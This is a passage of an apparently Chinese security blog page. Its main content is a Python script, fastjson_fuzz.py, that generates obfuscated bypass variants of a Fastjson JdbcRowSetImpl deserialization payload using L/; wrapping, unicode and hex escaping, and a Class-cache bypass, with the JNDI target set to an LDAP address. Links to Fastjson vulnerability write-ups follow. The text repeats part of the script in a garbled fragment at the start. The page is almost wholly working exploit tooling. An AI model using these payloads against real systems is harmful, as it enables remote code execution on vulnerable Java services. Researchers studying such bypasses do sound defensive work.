<span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload, <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&quot;LL&quot;</span> + v + <span class="hljs-string">&quot;;;&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value进行\u</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload3</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload,<br>                               <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v.encode())).replace(<span class="hljs-string">&quot;\\\\&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value进行\x</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload4</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload,<br>                               <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v.encode())).replace(<span class="hljs-string">&quot;\\\\&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><br>    <span class="hljs-comment"># 生成cache绕过payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload5</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        cache_payload = &#123;<br>            <span class="hljs-string">&quot;rand1&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>                <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>            &#125;<br>        &#125;<br>        cache_payload[<span class="hljs-string">&quot;rand2&quot;</span>] = json.loads(payload)<br>        <span class="hljs-keyword">return</span> json.dumps(cache_payload)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen</span>(<span class="hljs-params">self</span>):</span><br>        payloads = []<br><br>        payload1 = self.gen_payload1(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload1<br><br>        payload2 = self.gen_payload2(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload2<br><br>        payload3 = self.gen_payload3(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload3<br><br>        payload4 = self.gen_payload4(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload4<br><br>        payload5 = self.gen_payload5(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload5<br><br>        payloads.append(payload1)<br>        payloads.append(payload2)<br>        payloads.append(payload5)<br><br>        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:<br>            <span class="hljs-keyword">yield</span> self.gen_payload3(payload)<br>            <span class="hljs-keyword">yield</span> self.gen_payload4(payload)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    fjp = FastJsonPayload(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;</span><br><span class="hljs-string">  &quot;rand1&quot;: &#123;</span><br><span class="hljs-string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="hljs-string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class="hljs-string">    &quot;autoCommit&quot;: true</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;&#x27;&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> fjp.gen():<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in"><code class="language-hljs python"><span class="hljs-comment">#!usr/bin/env python  </span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">@author: longofo</span><br><span class="hljs-string">@file: fastjson_fuzz.py </span><br><span class="hljs-string">@time: 2020/05/07 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> JSONDecodeError<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastJsonPayload</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, base_payload</span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            json.loads(base_payload)<br>        <span class="hljs-keyword">except</span> JSONDecodeError <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-keyword">raise</span> ex<br>        self.base_payload = base_payload<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_common</span>(<span class="hljs-params">self, payload, func</span>):</span><br>        tmp_payload = json.loads(payload)<br>        dct_objs = [tmp_payload]<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(dct_objs) &gt; <span class="hljs-number">0</span>:<br>            tmp_objs = []<br>            <span class="hljs-keyword">for</span> dct_obj <span class="hljs-keyword">in</span> dct_objs:<br>                <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dct_obj:<br>                    <span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;@type&quot;</span>:<br>                        dct_obj[key] = func(dct_obj[key])<br><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(dct_obj[key]) == <span class="hljs-built_in">dict</span>:<br>                        tmp_objs.append(dct_obj[key])<br>            dct_objs = tmp_objs<br>        <span class="hljs-keyword">return</span> json.dumps(tmp_payload)<br><br>    <span class="hljs-comment"># 对@type的value增加L开头，;结尾的payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload1</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload, <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&quot;L&quot;</span> + v + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value增加LL开头，;;结尾的payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload2</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload, <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&quot;LL&quot;</span> + v + <span class="hljs-string">&quot;;;&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value进行\u</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload3</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload,<br>                               <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v.encode())).replace(<span class="hljs-string">&quot;\\\\&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value进行\x</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload4</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload,<br>                               <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v.encode())).replace(<span class="hljs-string">&quot;\\\\&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><br>    <span class="hljs-comment"># 生成cache绕过payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload5</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        cache_payload = &#123;<br>            <span class="hljs-string">&quot;rand1&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>                <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>            &#125;<br>        &#125;<br>        cache_payload[<span class="hljs-string">&quot;rand2&quot;</span>] = json.loads(payload)<br>        <span class="hljs-keyword">return</span> json.dumps(cache_payload)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen</span>(<span class="hljs-params">self</span>):</span><br>        payloads = []<br><br>        payload1 = self.gen_payload1(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload1<br><br>        payload2 = self.gen_payload2(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload2<br><br>        payload3 = self.gen_payload3(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload3<br><br>        payload4 = self.gen_payload4(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload4<br><br>        payload5 = self.gen_payload5(self.base_payload)<br>        <span class="hljs-keyword">yield</span> payload5<br><br>        payloads.append(payload1)<br>        payloads.append(payload2)<br>        payloads.append(payload5)<br><br>        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:<br>            <span class="hljs-keyword">yield</span> self.gen_payload3(payload)<br>            <span class="hljs-keyword">yield</span> self.gen_payload4(payload)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    fjp = FastJsonPayload(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;</span><br><span class="hljs-string">  &quot;rand1&quot;: &#123;</span><br><span class="hljs-string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="hljs-string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class="hljs-string">    &quot;autoCommit&quot;: true</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;&#x27;&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> fjp.gen():<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure>



<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/#fastjson">https://paper.seebug.org/1192/#fastjson</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/#0x01-fastjson">https://paper.seebug.org/994/#0x01-fastjson</a></p>
<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#fastjson-lt-1-2-68">https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#fastjson-lt-1-2-68</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>